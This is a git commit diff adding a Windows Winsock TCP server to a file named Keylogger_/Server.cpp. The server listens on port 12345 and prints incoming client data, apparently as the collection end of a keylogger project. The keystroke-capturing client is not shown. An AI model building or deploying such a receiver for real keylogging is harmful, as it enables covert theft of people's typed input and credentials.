5dfce2f1eae023b490f0d4f34a8c8a706cc4068c
Trịnh Đắc Lượng <luongtrinh2k3ndad@gmail.com>
2025-07-03 14:53:43 +0700

    Update Server.cpp

--- Keylogger_/Server.cpp
+++ Keylogger_/Server.cpp
@@ -1,20 +1,72 @@
-// Server.cpp : This file contains the 'main' function. Program execution begins and ends there.
-//
-
+#include <winsock2.h>   
+#include <ws2tcpip.h>
+#include <windows.h>
 #include <iostream>
+#include <string>
+
+#pragma comment(lib, "Ws2_32.lib") 
+
+using namespace std;
 
 int main()
 {
-    std::cout << "Hello World!\n";
+    WSADATA wsa;
+    WORD version = MAKEWORD(2, 2);
+    int error = WSAStartup(version, &wsa);
+    if (error != 0) {
+        cerr << "WSAStartup failed: " << error << endl;
+        return 1;
+    }
+    SOCKET serverSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+    if (serverSocket == INVALID_SOCKET) {
+        cerr << "Socket creation failed: " << WSAGetLastError() << endl;
+        WSACleanup();
+        return 1;
+    }
+    sockaddr_in serverAddress{};
+    serverAddress.sin_family = AF_INET;
+    serverAddress.sin_port = htons(12345);
+    serverAddress.sin_addr.s_addr = INADDR_ANY;
+    if (bind(serverSocket, (SOCKADDR*)&serverAddress, sizeof(serverAddress)) == SOCKET_ERROR) {
+        cerr << "Bind failed: " << WSAGetLastError() << endl;
+        closesocket(serverSocket);
+        WSACleanup();
+        return 1;
+    }
+    if (listen(serverSocket, SOMAXCONN) == SOCKET_ERROR) {
+        cerr << "Listen failed: " << WSAGetLastError() << endl;
+        closesocket(serverSocket);
+        WSACleanup();
+        return 1;
+    }
+    cout << "Server listening on port 12345..." << endl;
+    sockaddr_in clientAddress{};
+    int clientSize = sizeof(clientAddress);
+
+    SOCKET clientSocket = accept(serverSocket, (SOCKADDR*)&clientAddress, &clientSize);
+    if (clientSocket == INVALID_SOCKET) {
+        cerr << "Accept failed: " << WSAGetLastError() << endl;
+        closesocket(serverSocket);
+        WSACleanup();
+        return 1;
+    }
+    else {
+        cout << "co lua co lua" << endl;
+    }
+    while (true) {
+        Sleep(1000);
+        char buffer[100] = { 0 };
+        int recvLen = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
+        if (recvLen == SOCKET_ERROR) {
+            cerr << "Receive failed: " << WSAGetLastError() << endl;
+        }
+        else {
+            cout << "Client says: " << buffer << endl;
+        }
+    }
+    closesocket(clientSocket);
+    closesocket(serverSocket);
+    WSACleanup();
+
+    return 0;
 }
-
-// Run program: Ctrl + F5 or Debug > Start Without Debugging menu
-// Debug program: F5 or Debug > Start Debugging menu
-
-// Tips for Getting Started: 
-//   1. Use the Solution Explorer window to add/manage files
-//   2. Use the Team Explorer window to connect to source control
-//   3. Use the Output window to see build output and other messages
-//   4. Use the Error List window to view errors
-//   5. Go to Project > Add New Item to create new code files, or Project > Add Existing Item to add existing code files to the project
-//   6. In the future, to open this project again, go to File > Open > Project and select the .sln file
